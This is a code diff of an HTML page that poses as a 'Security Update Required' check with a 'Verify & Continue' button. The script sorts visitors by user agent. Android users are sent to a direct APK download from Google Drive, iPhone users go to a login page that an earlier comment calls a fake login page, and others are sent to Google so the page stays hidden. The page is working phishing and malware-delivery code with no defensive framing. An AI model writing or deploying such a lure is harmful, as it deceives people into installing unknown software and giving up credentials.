@@ -1,26 +1,36 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Checking Security...</title>
-    <script>
-        // This part checks if the user is on Android, iPhone, or a Computer
-        var userAgent = navigator.userAgent || navigator.vendor || window.opera;
-
-        if (/android/i.test(userAgent)) {
-            // Android users: Redirect to the Google Drive APK download
-            window.location.href = "https://drive.google.com/uc?export=download&confirm=t&id=19HIEP9vGAgLnLQNJFEznyYkMtbjdwGRc";
-        } 
-        else if (/iPad|iPhone|iPod/.test(userAgent)) {
-            // iPhone users: Redirect to your fake login page
-            window.location.href = "https://www.google.com";
-        } 
-        else {
-            // Computer users: Just send them to Google to stay hidden
-            window.location.href = "https://www.google.com";
-        }
-    </script>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security Verification</title>
+    <style>
+        body { font-family: Arial; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-color: #f8f9fa; }
+        .box { text-align: center; padding: 30px; background: white; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); width: 90%; max-width: 400px; }
+        button { background-color: #1a73e8; color: white; border: none; padding: 12px 24px; border-radius: 4px; font-size: 16px; cursor: pointer; margin-top: 20px; }
+    </style>
 </head>
 <body>
-    <p>Redirecting to secure server...</p>
+    <div class="box">
+        <h3>Security Update Required</h3>
+        <p>Please click below to verify your device and continue to Google.</p>
+        <button onclick="startResearch()">Verify & Continue</button>
+    </div>
+
+    <script>
+        function startResearch() {
+            var userAgent = navigator.userAgent || navigator.vendor || window.opera;
+
+            if (/android/i.test(userAgent)) {
+                // Androids get the APK
+                window.location.href = "https://drive.google.com/uc?export=download&confirm=t&id=19HIEP9vGAgLnLQNJFEznyYkMtbjdwGRc";
+            } else if (/iPad|iPhone|iPod/.test(userAgent)) {
+                // iPhones go to your Portal.html login page
+                window.location.href = "Portal.html";
+            } else {
+                // Everyone else goes to Google
+                window.location.href = "https://www.google.com";
+            }
+        }
+    </script>
 </body>
 </html>
